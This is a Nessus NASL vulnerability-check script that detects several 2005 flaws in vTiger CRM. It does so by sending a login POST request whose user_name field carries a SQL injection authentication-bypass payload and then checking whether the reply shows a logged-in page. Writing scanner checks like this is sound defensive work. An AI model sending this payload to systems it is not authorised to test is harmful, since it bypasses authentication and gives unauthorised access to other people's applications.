#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref: Christopher Kunz from Hardened-PHP Project & SEC-CONSULT
#
# This script is released under the GNU GPLv2
#

if (description) {
script_id(20317);
script_cve_id("CVE-2005-3818", "CVE-2005-3819", "CVE-2005-3820", "CVE-2005-3821", "CVE-2005-3822", "CVE-2005-3823", "CVE-2005-3824");
script_bugtraq_id(15562, 15569);
script_version("$Revision: 1.2 $");

name["english"] = "vTiger multiple flaw";
script_name(english:name["english"]);

desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple flaws.

Description:

The remote version of this software is prone to arbitrary code
execution, directory traversal, SQL injection (allowing authentication 
bypass), cross-site scripting attacks.

See also: 

http://www.hardened-php.net/advisory_232005.105.html
http://www.sec-consult.com/231.html

Solution :

Upgrade to vtiger 4.5 alpha 2 or later.

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";

script_description(english:desc["english"]);

summary["english"] = "Checks for authentication bypass in vTiger";
script_summary(english:summary["english"]);

script_category(ACT_GATHER_INFO);
script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");

family["english"] = "CGI abuses";
script_family(english:family["english"]);

script_dependencie("http_version.nasl");
script_require_ports("Services/www", 80);
script_exclude_keys("Settings/disable_cgi_scanning");

exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if (! can_host_php(port:port) ) exit(0);

# Loop through various directories.
if (thorough_tests) dirs = make_list("/tigercrm", "/crm", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (res == NULL) exit(0);

  # If it looks like vtiger...
  if (
    'HREF="include/images/vtigercrm_icon.ico">' >< res ||
    "vtiger.com is not affiliated with nor endorsed by" >< res
  ) {

    filename = string(dir, "/index.php");
    variables = string("module=Users&action=Authenticate&return_module=Users&return_action=Login&user_name=admin%27+or+%271%27%3D%271&user_password=test&login_theme=blue&login_language=en_us&Login=++Login++");
    host=get_host_name();
    req = string(
      "POST ", filename, " HTTP/1.0\r\n", 
      "Referer: ","http://", host, filename, "\r\n",
      "Host: ", host, ":", port, "\r\n", 
      "Content-Type: application/x-www-form-urlencoded\r\n", 
      "Content-Length: ", strlen(variables), 
      "\r\n\r\n", 
      variables
    );
    result = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    debug_print("result='", result,"'.");

    if(
      # Link to My Account
      "?module=Users&action=DetailView&record=" >< result ||
      "New Contact" >< result
    ) {
      security_hole(port);
      exit(0);
    }
  }
}
